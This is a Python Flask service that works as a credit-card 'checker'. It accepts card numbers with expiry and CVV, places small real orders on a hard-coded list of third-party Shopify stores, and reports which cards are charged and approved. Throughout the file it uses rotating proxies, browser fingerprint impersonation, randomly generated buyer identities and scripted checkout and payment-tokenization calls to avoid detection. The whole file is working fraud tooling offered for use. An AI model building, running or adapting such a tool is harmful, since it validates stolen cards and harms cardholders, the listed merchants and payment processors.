import os
import random
import re
import html
import string
import uuid
import time
import json
import urllib3
from urllib.parse import quote, unquote, urlparse, parse_qs
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ==========================================
# ⚡ THREAD POOL — concurrent card processing
# ==========================================
from concurrent.futures import ThreadPoolExecutor
import threading

MAX_WORKERS   = 50          # max simultaneous card checks
PROXY_LOCK    = threading.Lock()
_executor     = ThreadPoolExecutor(max_workers=MAX_WORKERS)

# Proxy pool — loaded once at startup from proxies.txt
_PROXY_POOL: list[str] = []
_proxy_index = 0

def _load_proxies():
    global _PROXY_POOL
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            _PROXY_POOL = [l.strip() for l in f if l.strip() and not l.startswith("#")]

def get_next_proxy() -> str:
    """Round-robin proxy selection — thread-safe."""
    global _proxy_index
    if not _PROXY_POOL:
        return "DIRECT"
    with PROXY_LOCK:
        proxy = _PROXY_POOL[_proxy_index % len(_PROXY_POOL)]
        _proxy_index += 1
    return parse_proxy(proxy)

_load_proxies()

# ==========================================
# 🏪 STORES
# ==========================================
STORES = [
    {"shop_url": "https://thats-what-che-said.myshopify.com",        "variant_id": "32656445571154", "price": "2.5",  "currency": "USD", "product_url": "https://thats-what-che-said.myshopify.com/products/coffee-before-wordle"},
    {"shop_url": "https://klubfiller.myshopify.com",                  "variant_id": "49321449652532", "price": "2.0",  "currency": "GBP", "product_url": "https://klubfiller.myshopify.com/products/klubfiller-waiting-for-tonight"},
    {"shop_url": "https://the-brush-lettering-club.myshopify.com",   "variant_id": "58864569811325", "price": "1.5",  "currency": "GBP", "product_url": "https://the-brush-lettering-club.myshopify.com/products/love-brush-lettering-practice-sheet"},
    {"shop_url": "https://loveathomeeducation.myshopify.com",         "variant_id": "49260930990270", "price": "2.0",  "currency": "USD", "product_url": "https://loveathomeeducation.myshopify.com/products/ms-frizzle-earth-science-addition-8-units-pre-sale"},
    {"shop_url": "https://the-coloring-project.myshopify.com",        "variant_id": "51956110360864", "price": "1.99", "currency": "USD", "product_url": "https://the-coloring-project.myshopify.com/products/beautiful-noise-inspired-single-coloring-page-i-am-i-said"},
    {"shop_url": "https://leemo-designs.myshopify.com",               "variant_id": "39969683538014", "price": "3.0",  "currency": "USD", "product_url": "https://leemo-designs.myshopify.com/products/digital-download-printable-daily-planner"},
    {"shop_url": "https://math-giraffe-shop.myshopify.com",           "variant_id": "43428300390612", "price": "1.75", "currency": "USD", "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"},
    {"shop_url": "https://swirly-shop-6926.myshopify.com",            "variant_id": "53010324652341", "price": "1.29", "currency": "USD", "product_url": "https://swirly-shop-6926.myshopify.com/products/pomegranate-seed"},
    {"shop_url": "https://trebuchet-magazine.myshopify.com",          "variant_id": "39682457206850", "price": "2.0",  "currency": "GBP", "product_url": "https://trebuchet-magazine.myshopify.com/products/trebuchet-10-materials-ii-download"},
    {"shop_url": "https://math-giraffe-shop.myshopify.com",           "variant_id": "43428300390612", "price": "1.75", "currency": "USD", "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"},
]

# ==========================================
# 🎭 BROWSER PROFILES
# ==========================================
BROWSER_PROFILES = [
    {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
    {"impersonate": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
    {"impersonate": "chrome119", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
]

def get_random_browser():
    return random.choice(BROWSER_PROFILES)

# ==========================================
# 🎭 IDENTITY
# ==========================================
FIRST_NAMES = ["Luna", "Oliver", "Milo", "Bella", "Leo", "Chloe", "Max", "Lucy", "James", "Emma"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

# Tax-free US states only
ADDRESSES = [
    {"street": "100 SW Main St",          "city": "Portland",    "state": "OR", "zip": "97204"},
    {"street": "223 Pioneer Blvd",         "city": "Salem",       "state": "OR", "zip": "97301"},
    {"street": "101 N Last Chance Gulch",  "city": "Helena",      "state": "MT", "zip": "59601"},
    {"street": "234 Higgins Ave",          "city": "Missoula",    "state": "MT", "zip": "59801"},
    {"street": "1 Granite St",             "city": "Concord",     "state": "NH", "zip": "03301"},
    {"street": "500 Elm St",               "city": "Manchester",  "state": "NH", "zip": "03101"},
    {"street": "100 W 10th St",            "city": "Wilmington",  "state": "DE", "zip": "19801"},
    {"street": "200 N Orange St",          "city": "Dover",       "state": "DE", "zip": "19901"},
]

def generate_identity():
    fn   = random.choice(FIRST_NAMES)
    ln   = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    addr  = random.choice(ADDRESSES)
    return fn, ln, email, addr["street"], addr["city"], addr["state"], addr["zip"]

def random_suffix(n=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def parse_card(card_str):
    parts = card_str.split("|")
    if len(parts) >= 4:
        ccn  = parts[0].strip().replace(" ", "")
        mm   = parts[1].strip()
        yy   = parts[2].strip()
        cvv  = parts[3].strip()
        yyyy = "20" + yy if len(yy) == 2 else yy
        return ccn, mm, yyyy, cvv
    return None

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    for scheme in ["socks5://", "socks5h://", "http://", "https://"]:
        if proxy_str.startswith(scheme):
            proxy_str = proxy_str[len(scheme):]
            break
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"socks5h://{parts[0]}:{parts[1]}"
    elif len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        pw = ":".join(parts[3:])
        return f"socks5h://{user}:{pw}@{host}:{port}"
    return f"socks5h://{proxy_str}"

def extract_session_token(raw_html):
    """
    Extract session token from raw HTML (before html.unescape).
    Token is wrapped in &quot; inside the meta content attribute.
    """
    patterns = [
        r'name="serialized-sessionToken"\s+content="([^"]+)"',
        r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, raw_html)
        if m:
            t = m.group(1).strip()
            # Strip HTML-encoded quotes &quot; wrapping the value
            if t.startswith("&quot;"):
                t = t[6:]
            if t.endswith("&quot;"):
                t = t[:-6]
            t = t.strip('"\'')
            if len(t) > 50:
                return t
    return None

def run_proposal(session, shop_url, cart_token, checkout_url, build_id,
                 session_token, queue_token, stable_id, variant_id,
                 fn, ln, email, street, city, state, zipc,
                 ccn_bin, amount, currency, ua, with_payment=True):
    """
    Run Proposal GraphQL mutation.
    with_payment=False → warm-up call (no creditCardBin)
    Returns the full response JSON or None.
    """
    headers = {
        "accept":                       "application/json",
        "accept-language":              "en-US",
        "content-type":                 "application/json",
        "origin":                       shop_url,
        "referer":                      checkout_url,
        "shopify-checkout-client":      "checkout-web/1.0",
        "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
        "user-agent":                   ua,
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id":      build_id,
        "x-checkout-web-deploy-stage":  "production",
        "x-checkout-web-server-handling":  "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id":     cart_token,
    }
    payload = {
        "variables": {
            "sessionInput":  {"sessionToken": session_token},
            "queueToken":    queue_token or "",
            "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["NONE"],
                    "expectedTotalPrice":  {"any": True},
                    "destinationChanged":  True,
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id":        f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }
                    },
                    "quantity":           {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency}},
                    "lineComponentsSource": None, "lineComponents": [],
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount":  {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": street, "address2": "",
                        "city": city, "countryCode": "US", "postalCode": zipc,
                        "firstName": fn, "lastName": ln, "zoneCode": state, "phone": "",
                    }
                },
                "creditCardBin":    ccn_bin if with_payment else "",
                "allowStoreCredit": False,
            },
            "buyerIdentity": {
                "customer":          {"presentmentCurrency": currency, "countryCode": "US"},
                "email":             email,
                "emailChanged":      True,
                "phoneCountryCode":  "US",
                "marketingConsent":  [{"email": {"consentState": "DECLINED", "value": email}}],
                "shopPayOptInPhone": {"number": "", "countryCode": "US"},
                "rememberMe":        False,
            },
            "tip":    {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": [],
            },
            "note":                   {"message": None, "customAttributes": []},
            "localizationExtension":  {"fields": []},
            "nonNegotiableTerms":     None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "includeBuyerProposalDelivery": False,
            "includeBuyerProposalMerchandiseDescriptions": False,
        },
        "operationName": "Proposal",
        "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8",
    }
    try:
        r = session.post(
            f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
            headers=headers, json=payload, timeout=25,
        )
        return r.json()
    except Exception:
        return None

# ==========================================
# 🛒 MAIN CHECKOUT
# ==========================================
def process_checkout(card_data, proxy_url, store):
    ccn, mm, yyyy, cvv = card_data
    SHOP_URL   = store["shop_url"]
    VARIANT_ID = store["variant_id"]
    PRODUCT_URL = store["product_url"]
    amount     = store["price"]
    currency   = store["currency"]

    browser    = get_random_browser()
    session    = requests.Session(impersonate=browser["impersonate"])
    ua         = browser["ua"]

    if proxy_url and proxy_url != "DIRECT":
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # ── STEP 1: Add to cart ──────────────────────────────────────────────
        r = session.post(
            f"{SHOP_URL}/cart/add.js",
            headers={"content-type": "application/json", "origin": SHOP_URL,
                     "referer": PRODUCT_URL, "user-agent": ua},
            json={"id": int(VARIANT_ID), "quantity": 1},
            timeout=20,
        )
        if r.status_code != 200 or "id" not in r.json():
            return {"Response": "CART_FAILED", "success": False}

        # ── STEP 2: POST /cart → get redirect ───────────────────────────────
        r = session.post(
            f"{SHOP_URL}/cart",
            headers={"content-type": "application/x-www-form-urlencoded",
                     "origin": SHOP_URL, "referer": PRODUCT_URL, "user-agent": ua},
            data="checkout=",
            allow_redirects=False,
            timeout=20,
        )
        redirect_url = r.headers.get("Location") if r.status_code in [301,302,303,307,308] else None
        if not redirect_url:
            return {"Response": "CHECKOUT_REDIRECT_FAILED", "success": False}

        # Extract cart token from redirect
        m = re.search(r"/cn/([^/]+)/", redirect_url)
        if not m:
            return {"Response": "CART_TOKEN_MISSING", "success": False}
        cart_token = m.group(1)

        # Build real checkout URL — use redirect directly, add skip_shop_pay
        parsed = urlparse(redirect_url)
        params = parse_qs(parsed.query)
        real_checkout_url = unquote(params["ur_back_url"][0]) if "ur_back_url" in params else redirect_url
        if "skip_shop_pay" not in real_checkout_url:
            sep = "&" if "?" in real_checkout_url else "?"
            real_checkout_url += f"{sep}skip_shop_pay=true&auto_redirect=false&edge_redirect=true"

        # ── STEP 3: Load checkout page ───────────────────────────────────────
        r = session.get(
            real_checkout_url,
            headers={"accept": "text/html", "cache-control": "max-age=0", "user-agent": ua},
            allow_redirects=True, timeout=25,
        )
        raw_text   = r.text
        clean_text = html.unescape(raw_text)

        # Extract tokens
        session_token = extract_session_token(raw_text) or extract_session_token(clean_text) or ""
        queue_token   = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"']:
            m2 = re.search(pat, clean_text)
            if m2:
                queue_token = m2.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([0-9a-f-]{36})"']:
            m2 = re.search(pat, clean_text)
            if m2:
                stable_id = m2.group(1)
                break

        build_id = ""
        for pat in [r'"commitSha"\s*:\s*"([0-9a-f]{40})"',
                    r'x-checkout-web-build-id["\s:]+([0-9a-f]{40})']:
            m2 = re.search(pat, clean_text)
            if m2:
                build_id = m2.group(1)
                break

        # Use store currency/price — override with page values if found
        m2 = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text)
        if m2:
            currency = m2.group(1)

        if not stable_id:
            return {"Response": "MISSING_STABLE_ID", "success": False}

        # ── STEP 4a: Warm-up Proposal (no payment BIN) ──────────────────────
        fn, ln, email, street, city, state, zipc = generate_identity()
        warmup = run_proposal(
            session, SHOP_URL, cart_token, real_checkout_url, build_id,
            session_token, queue_token, stable_id, VARIANT_ID,
            fn, ln, email, street, city, state, zipc,
            "", amount, currency, ua, with_payment=False,
        )
        if warmup:
            neg = warmup.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            if neg.get("queueToken"): queue_token   = neg["queueToken"]
            new_tok = warmup.get("data", {}).get("session", {}).get("sessionToken")
            if new_tok: session_token = new_tok

        time.sleep(2)  # Let WAITING_PENDING_TERMS resolve

        # ── STEP 4b: Proposal with payment BIN ──────────────────────────────
        fn, ln, email, street, city, state, zipc = generate_identity()
        prop_resp = run_proposal(
            session, SHOP_URL, cart_token, real_checkout_url, build_id,
            session_token, queue_token, stable_id, VARIANT_ID,
            fn, ln, email, street, city, state, zipc,
            ccn[:8], amount, currency, ua, with_payment=True,
        )
        if not prop_resp:
            return {"Response": "PROPOSAL_FAILED", "success": False}

        neg = prop_resp.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
        if neg.get("queueToken"): queue_token   = neg["queueToken"]
        new_tok = prop_resp.get("data", {}).get("session", {}).get("sessionToken")
        if new_tok: session_token = new_tok

        seller = neg.get("sellerProposal", {})

        # Get paymentMethodIdentifier from availablePaymentLines (not paymentLines which may be empty)
        payment_method_id = None
        avail_lines = seller.get("payment", {}).get("availablePaymentLines", [])
        for line in avail_lines:
            pm = line.get("paymentMethod", {})
            if pm.get("name") == "shopify_payments":
                payment_method_id = pm.get("paymentMethodIdentifier")
                break

        if not payment_method_id:
            return {"Response": "NO_PAYMENT_METHOD", "success": False}

        # Update amount from proposal
        try:
            amount = seller["checkoutTotal"]["value"]["amount"]
        except (KeyError, TypeError):
            try:
                amount = seller["runningTotal"]["value"]["amount"]
            except (KeyError, TypeError):
                pass

        # ── STEP 5: Tokenize card via PCI ────────────────────────────────────
        fn, ln, email, street, city, state, zipc = generate_identity()
        encoded_url = quote(real_checkout_url, safe="")
        pci_headers = {
            "accept":           "application/json",
            "content-type":     "application/json",
            "origin":           "https://checkout.pci.shopifyinc.com",
            "referer":          f"https://checkout.pci.shopifyinc.com/build/09497de/number-ltr.html?identifier=&locationURL={encoded_url}",
            "user-agent":       ua,
        }
        pci_payload = {
            "credit_card": {
                "number":             ccn.replace(" ", ""),
                "month":              int(mm),
                "year":               int(yyyy),
                "verification_value": cvv,
                "start_month":        None,
                "start_year":         None,
                "issue_number":       "",
                "name":               f"{fn} {ln}",
            },
            "payment_session_scope": SHOP_URL.split("//")[1],
        }
        r_pci = session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            headers=pci_headers, json=pci_payload, timeout=20,
        )
        if r_pci.status_code != 200:
            return {"Response": "PCI_FAILED", "success": False}
        session_id = r_pci.json().get("id")
        if not session_id:
            return {"Response": "PCI_NO_SESSION", "success": False}

        time.sleep(1)

        # ── STEP 6: SubmitForCompletion ──────────────────────────────────────
        submit_headers = {
            "accept":                          "application/json",
            "accept-language":                 "en-US",
            "content-type":                    "application/json",
            "origin":                          SHOP_URL,
            "referer":                         real_checkout_url,
            "shopify-checkout-client":         "checkout-web/1.0",
            "shopify-checkout-source":         f'id="{cart_token}", type="cn"',
            "user-agent":                      ua,
            "x-checkout-one-session-token":    session_token,
            "x-checkout-web-build-id":         build_id,
            "x-checkout-web-deploy-stage":     "production",
            "x-checkout-web-server-handling":  "fast",
            "x-checkout-web-server-rendering": "yes",
            "x-checkout-web-source-id":        cart_token,
        }

        def billing_address():
            return {
                "address1": street, "address2": "",
                "city": city, "countryCode": "US", "postalCode": zipc,
                "firstName": fn, "lastName": ln, "zoneCode": state, "phone": "",
            }

        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput":  {"sessionToken": session_token},
                    "queueToken":    queue_token,
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["NONE"],
                            "expectedTotalPrice":  {"any": True},
                            "destinationChanged":  True,
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":        f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                                    "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                                }
                            },
                            "quantity":           {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_method_id,
                                    "sessionId":               session_id,
                                    "billingAddress":          {"streetAddress": billing_address()},
                                    "cardSource":              None,
                                },
                                "giftCardPaymentMethod":              None,
                                "ownedGiftCardPaymentMethod":         None,
                                "redeemablePaymentMethod":            None,
                                "walletPaymentMethod":                None,
                                "walletsPlatformPaymentMethod":       None,
                                "localPaymentMethod":                 None,
                                "paymentOnDeliveryMethod":            None,
                                "paymentOnDeliveryMethod2":           None,
                                "manualPaymentMethod":                None,
                                "customPaymentMethod":                None,
                                "offsitePaymentMethod":               None,
                                "customOnsitePaymentMethod":          None,
                                "deferredPaymentMethod":              None,
                                "customerCreditCardPaymentMethod":    None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument":            None,
                            },
                            "amount": {"value": {"amount": str(amount), "currencyCode": currency}},
                        }],
                        "billingAddress": {"streetAddress": billing_address()},
                        "creditCardBin":    ccn[:8],
                        "allowStoreCredit": False,
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": "US"},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  "US",
                        "marketingConsent":  [{"email": {"consentState": "DECLINED", "value": email}}],
                        "shopPayOptInPhone": {"number": "", "countryCode": "US"},
                        "rememberMe":        False,
                    },
                    "tip":    {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note":                   {"message": None, "customAttributes": []},
                    "localizationExtension":  {"fields": []},
                    "shopPayArtifact": {
                        "optIn": {"vaultEmail": "", "vaultPhone": "", "optInSource": "REMEMBER_ME"}
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                    },
                    "optionalDuties":  {"buyerRefusesDuties": False},
                    "cartMetafields":  [],
                },
                "attemptToken": f"{cart_token}-{random_suffix()}",
                "metafields":   [],
                "analytics": {
                    "requestUrl": real_checkout_url,
                    "pageId":     str(uuid.uuid4()),
                },
            },
            "operationName": "SubmitForCompletion",
            "id": "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419",
        }

        r_submit = session.post(
            f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
            headers=submit_headers, json=submit_payload, timeout=25,
        )
        sfc_data = r_submit.json()
        sfc      = sfc_data.get("data", {}).get("submitForCompletion", {})
        receipt  = sfc.get("receipt", {})
        rtype    = receipt.get("__typename", "")

        if rtype == "FailedReceipt":
            err  = receipt.get("processingError", {})
            code = err.get("code", "CARD_DECLINED")
            return {
                "Response": code,
                "Price":    f"{amount} {currency}",
                "Gate":     "Shopify Payments",
                "success":  False,
            }

        if rtype == "ProcessedReceipt":
            return {
                "Response": "ORDER_PLACED",
                "Charged":  "True",
                "Approved": "True",
                "Price":    f"{amount} {currency}",
                "Gate":     "Shopify Payments",
                "success":  True,
            }

        if rtype == "ProcessingReceipt":
            # ── STEP 7: Poll for receipt ─────────────────────────────────────
            receipt_id = receipt.get("id")
            poll_headers = submit_headers.copy()
            for _ in range(12):
                time.sleep(2)
                poll_payload = {
                    "variables": {
                        "receiptId":    receipt_id,
                        "sessionToken": session_token,
                    },
                    "operationName": "PollForReceipt",
                    "id": "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567",
                }
                r_poll = session.post(
                    f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=PollForReceipt",
                    headers=poll_headers, json=poll_payload, timeout=25,
                )
                poll_data = r_poll.json()
                poll_receipt = poll_data.get("data", {}).get("receipt", {})
                ptype        = poll_receipt.get("__typename", "")

                if ptype == "ProcessedReceipt":
                    return {
                        "Response": "ORDER_PLACED",
                        "Charged":  "True",
                        "Approved": "True",
                        "Price":    f"{amount} {currency}",
                        "Gate":     "Shopify Payments",
                        "success":  True,
                    }
                if ptype == "FailedReceipt":
                    err  = poll_receipt.get("processingError", {})
                    code = err.get("code", "CARD_DECLINED")
                    msg  = err.get("messageUntranslated", "")
                    return {
                        "Response": f"{code}",
                        "Message":  msg,
                        "Price":    f"{amount} {currency}",
                        "Gate":     "Shopify Payments",
                        "success":  False,
                    }
                if ptype == "ThrottledReceipt":
                    wait = poll_receipt.get("pollDelay", 2)
                    time.sleep(wait)

            return {"Response": "POLL_TIMEOUT", "Price": f"{amount} {currency}", "success": False}

        # sellerProposal or errors in submit response
        errors = sfc.get("errors", [])
        codes  = [e.get("code", "") for e in errors]
        return {
            "Response": codes[0] if codes else "UNKNOWN_RESPONSE",
            "Price":    f"{amount} {currency}",
            "success":  False,
        }

    except Exception as e:
        return {"Response": f"ERROR", "Message": str(e)[:100], "success": False}


# ==========================================
# 🌐 API ROUTES
# ==========================================
# Track active workers
_active = threading.Semaphore(MAX_WORKERS)
_busy   = {"count": 0}
_busy_lock = threading.Lock()

@app.route("/")
def check_card():
    card_str  = request.args.get("card")
    proxy_str = request.args.get("proxy", "")

    if not card_str:
        return jsonify({"Response": "MISSING_CARD", "success": False})

    card_data = parse_card(card_str)
    if not card_data:
        return jsonify({"Response": "INVALID_CARD", "success": False})

    store = random.choice(STORES)

    # Use caller-supplied proxy if given, otherwise pick one from pool
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
    else:
        proxy_url = get_next_proxy()

    with _busy_lock:
        _busy["count"] += 1

    try:
        result = process_checkout(card_data, proxy_url, store)
    finally:
        with _busy_lock:
            _busy["count"] -= 1

    result["Store"] = store["shop_url"]
    return jsonify(result)


@app.route("/health")
def health():
    with _busy_lock:
        busy = _busy["count"]
    return jsonify({
        "workers_busy": busy,
        "workers_cap":  MAX_WORKERS,
        "sites":        len(STORES),
        "proxies":      len(_PROXY_POOL),
        "status":       "ok",
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
